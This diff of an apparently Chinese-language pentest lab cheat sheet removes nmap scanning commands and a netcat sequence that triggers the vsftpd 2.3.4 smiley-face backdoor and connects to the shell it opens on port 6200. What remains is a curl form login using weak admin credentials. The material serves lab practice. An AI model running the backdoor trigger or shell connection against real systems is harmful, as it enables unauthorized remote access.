@@ -908,16 +908,6 @@ if ($is_admin = true) {     // 想写 ==，写成 =，所有人都是管理员
 
 
 ```bash
-# ---- 靶机存活与端口 ----
-nmap -sn 192.168.23.0/24                        # 只做主机发现
-nmap -p 21,6200 192.168.23.129                  # 指定端口
-nmap -sS -sV -T4 192.168.23.129                 # SYN 半开 + 版本探测
-
-# ---- 手工触发后门 ----
-printf 'USER test:)\r\nPASS test\r\n' | nc -w 3 192.168.23.129 21
-nmap -p 6200 192.168.23.129
-nc 192.168.23.129 6200
-
 # ---- 表单提交（别忘 submit） ----
 curl -s -d "username=admin&password=123456&submit=Login" <URL> | grep "login success"
 
